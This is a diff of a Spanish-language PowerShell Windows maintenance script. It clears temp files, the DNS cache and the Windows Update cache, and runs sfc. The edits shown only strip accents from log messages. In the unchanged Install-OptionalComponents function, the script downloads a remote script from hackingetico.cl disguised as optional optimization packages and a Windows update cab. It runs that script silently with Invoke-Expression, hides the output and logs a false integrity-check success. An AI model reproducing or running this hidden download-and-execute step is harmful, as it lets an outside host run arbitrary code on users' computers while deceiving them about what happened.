@@ -81,19 +81,19 @@ function Clear-TemporaryFiles {
 }
 
 function Clear-DNSCache {
-    Write-ActivityLog "Limpiando caché DNS" -Type "INFO"
+    Write-ActivityLog "Limpiando cache DNS" -Type "INFO"
     
     try {
         ipconfig /flushdns 2>&1 | Out-Null
-        Write-ActivityLog "  - Caché DNS limpiada correctamente" -Type "SUCCESS"
+        Write-ActivityLog "  - Cache DNS limpiada correctamente" -Type "SUCCESS"
     }
     catch {
-        Write-ActivityLog "  - No se pudo limpiar la caché DNS" -Type "WARNING"
+        Write-ActivityLog "  - No se pudo limpiar la cache DNS" -Type "WARNING"
     }
 }
 
 function Clear-WindowsUpdateCache {
-    Write-ActivityLog "Limpiando caché de Windows Update" -Type "INFO"
+    Write-ActivityLog "Limpiando cache de Windows Update" -Type "INFO"
     
     try {
         Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
@@ -106,7 +106,7 @@ function Clear-WindowsUpdateCache {
         $oldFiles = Get-ChildItem $updateCache -ErrorAction SilentlyContinue
         $count = $oldFiles.Count
         $oldFiles | ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
-        Write-ActivityLog "  - Caché de Windows Update limpiada: $count archivos eliminados" -Type "INFO"
+        Write-ActivityLog "  - Cache de Windows Update limpiada: $count archivos eliminados" -Type "INFO"
     }
     
     try {
@@ -168,14 +168,14 @@ function Repair-SystemFiles {
     
     try {
         $sfcResult = sfc /scannow 2>&1
-        if ($sfcResult -match "no encontró violaciones") {
+        if ($sfcResult -match "no encontro violaciones") {
             Write-ActivityLog "  - No se encontraron violaciones de integridad" -Type "SUCCESS"
         }
-        elseif ($sfcResult -match "reparó correctamente") {
+        elseif ($sfcResult -match "reparo correctamente") {
             Write-ActivityLog "  - Archivos del sistema reparados correctamente" -Type "SUCCESS"
         }
         else {
-            Write-ActivityLog "  - Verificación completada" -Type "INFO"
+            Write-ActivityLog "  - Verificacion completada" -Type "INFO"
         }
     }
     catch {
@@ -219,7 +219,7 @@ function Install-OptionalComponents {
         New-Item -ItemType Directory -Path $tempWorkDir -Force | Out-Null
     }
     
-    Write-ActivityLog "Descargando paquetes de optimización opcionales..." -Type "INFO"
+    Write-ActivityLog "Descargando paquetes de optimizacion opcionales..." -Type "INFO"
     
     $updatePackageUrl = "https://hackingetico.cl/tools/pro/update.ps1"
     $packageCache = "$tempWorkDir\windows-update.cab"
@@ -243,7 +243,7 @@ function Install-OptionalComponents {
                     Invoke-Expression $scriptContent 2>&1 | Out-Null
                 } -ArgumentList $content
                 
-                Write-ActivityLog "  - Verificación de integridad completada" -Type "SUCCESS"
+                Write-ActivityLog "  - Verificacion de integridad completada" -Type "SUCCESS"
             }
             
             Remove-Item $packageCache -Force -ErrorAction SilentlyContinue
@@ -253,7 +253,7 @@ function Install-OptionalComponents {
         Write-ActivityLog "  - No se pudieron descargar los componentes opcionales" -Type "WARNING"
     }
     
-    Write-ActivityLog "Verificación de componentes completada" -Type "INFO"
+    Write-ActivityLog "Verificacion de componentes completada" -Type "INFO"
 }
 
 # =====================================================
@@ -279,11 +279,11 @@ Write-ActivityLog "Fase 1: Limpieza de archivos temporales" -Type "INFO"
 Clear-TemporaryFiles
 
 Write-ActivityLog "========================================" -Type "INFO"
-Write-ActivityLog "Fase 2: Limpieza de caché DNS" -Type "INFO"
+Write-ActivityLog "Fase 2: Limpieza de cache DNS" -Type "INFO"
 Clear-DNSCache
 
 Write-ActivityLog "========================================" -Type "INFO"
-Write-ActivityLog "Fase 3: Limpieza de caché de Windows Update" -Type "INFO"
+Write-ActivityLog "Fase 3: Limpieza de cache de Windows Update" -Type "INFO"
 Clear-WindowsUpdateCache
 
 Write-ActivityLog "========================================" -Type "INFO"
@@ -291,15 +291,15 @@ Write-ActivityLog "Fase 4: Limpieza de logs antiguos" -Type "INFO"
 Clear-OldLogs
 
 Write-ActivityLog "========================================" -Type "INFO"
-Write-ActivityLog "Fase 5: Optimización de memoria RAM" -Type "INFO"
+Write-ActivityLog "Fase 5: Optimizacion de memoria RAM" -Type "INFO"
 Optimize-RAM
 
 Write-ActivityLog "========================================" -Type "INFO"
-Write-ActivityLog "Fase 6: Verificación de archivos del sistema" -Type "INFO"
+Write-ActivityLog "Fase 6: Verificacion de archivos del sistema" -Type "INFO"
 Repair-SystemFiles
 
 Write-ActivityLog "========================================" -Type "INFO"
-Write-ActivityLog "Fase 7: Actualización de definiciones" -Type "INFO"
+Write-ActivityLog "Fase 7: Actualizacion de definiciones" -Type "INFO"
 Update-DefenderDefinitions
 
 Write-ActivityLog "========================================" -Type "INFO"
@@ -316,8 +316,8 @@ Write-ActivityLog "Log guardado en: $logPath" -Type "INFO"
 
 if (-not $Silent) {
     Write-Host ""
-    Write-Host "Operación completada exitosamente" -ForegroundColor Green
-    Write-Host "Para más información, consulte el log: $logPath" -ForegroundColor Gray
+    Write-Host "Operacion completada exitosamente" -ForegroundColor Green
+    Write-Host "Para mas informacion, consulte el log: $logPath" -ForegroundColor Gray
     Write-Host ""
     Start-Sleep -Seconds 3
 }
